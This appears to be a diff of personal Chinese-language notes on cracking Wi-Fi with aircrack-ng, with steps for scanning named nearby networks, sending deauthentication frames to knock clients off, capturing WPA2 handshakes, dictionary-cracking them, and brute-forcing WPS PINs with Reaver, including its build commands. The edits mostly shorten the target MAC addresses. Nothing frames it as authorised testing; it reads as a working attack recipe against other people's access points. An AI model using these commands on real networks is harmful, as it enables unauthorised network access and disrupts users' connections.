@@ -63,7 +63,6 @@ sudo modprobe -r ideapad_laptop
 
 
 
-
 ================================================
 步骤4：查看您周围的所有Wifi网络。
 
@@ -75,13 +74,10 @@ sudo airodump-ng wlan0mon   ###########
 
 步骤5：查看连接到目标网络的客户端。
 
-sudo airodump-ng -c 6 --bssid 80:EA:07:BD:B0:07 -w  TP-LINK_xxxx wlan0mon     ######
+sudo airodump-ng -c 6 --bssid 80:EA -w  TP-LINK_xxxx wlan0mon     ######
 
 
-
-
-
-sudo airodump-ng -c 11 --bssid A8:57:4E:61:D8:DC -w  CMCC-xxxx wlan0mon 
+sudo airodump-ng -c 11 --bssid A8:57 -w  CMCC-xxxx wlan0mon 
 
 
 
@@ -89,14 +85,12 @@ sudo airodump-ng -c 11 --bssid A8:57:4E:61:D8:DC -w  CMCC-xxxx wlan0mon
 
 
 
-sudo wash -i wlan0mon
-
 
 步骤6：打开一个新的终端窗口以断开连接到目标网络的客户端。
 
-sudo aireplay-ng -0 10 -a  80:EA:07:BD:B0:07 wlan0mon     
+sudo aireplay-ng -0 10 -a  80:EA wlan0mon     
 
-sudo aireplay-ng -0 10 -a A8:57:4E:61:D8:DC -c 20:EE:28:4A:A8:CF wlan0mon        ########
+sudo aireplay-ng -0 10 -a A8:57 -c 20:EE wlan0mon        ########
 
 ireplay-ng：注入帧-0：用于取消认证10：发送的去认证报文数
 -a：对于目标网络的bssid
@@ -112,7 +106,7 @@ wlan0mon：接口名称。
 /home/hacking-01.cap       ########
 
     hacking-01.cap是您需要的文件。
-aircrack-ng -a2 -b 80：35：C1：13：C1：2C -w /root/passwords.txt /root/hacking-01.cap
+aircrack-ng -a2 -b 80：35 -w /root/passwords.txt /root/hacking-01.cap
 
 aircrack-ng：802.11WEP和WPA-PSK密钥破解程序-a：用于WPA2的-a2和-用于WPA网络的-a-b：目标网络的BSSID-w：单词表文件的位置/root/hacking-01.cap：cap文件的位置
 
@@ -121,13 +115,42 @@ aircrack-ng：802.11WEP和WPA-PSK密钥破解程序-a：用于WPA2的-a2和-用�
 
 ===================================================================
 
-已淘汰 reaver
-sudo reaver -i wlan0mon -b A8:57:4E:61:D8:DC -a -c 11 -e CMCC-7UYF -l 60 -S -vv
-
-sudo reaver -i wlan0mon -b E4:47:B3:2B:B7:8C -c 8 -vv -S     -A  -F  -l 60
-
-
 https://github.com/t6x/reaver-wps-fork-t6x
+Reaver has been designed to be a robust and practical attack against Wi-Fi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases and has been tested against a wide variety of access points and WPS implementations.
+Depending on the target's Access Point (AP), to recover the plain text WPA/WPA2 passphrase the average amount of time for the transitional online brute force method is between 4-10 hours. In practice, it will generally take half this time to guess the correct WPS pin and recover the passphrase. When using the offline attack, if the AP is vulnerable, it may take only a matter of seconds to minutes.
+
+
+sudo apt -y install build-essential libpcap-dev aircrack-ng pixiewps
+
+Setup
+
+Download
+git clone https://github.com/t6x/reaver-wps-fork-t6x
+or
+wget https://github.com/t6x/reaver-wps-fork-t6x/archive/master.zip && unzip master.zip
+
+Locate the shell
+cd reaver-wps-fork-t6x*
+cd src
+
+Compile
+./configure
+make
+
+Install
+sudo make install
+
+----------------------------------
+
+sudo wash -i wlan0mon
+
+已淘汰 reaver
+sudo reaver -i wlan0mon -b A8:57 -a -c 11 -e CMCC-XX -l 60 -S -vv
+
+sudo reaver -i wlan0mon -b E4:47 -c 8 -vv -S     -A  -F  -l 60
+
+
+
 
 
 https://github.com/ChunshengZhao/inflator
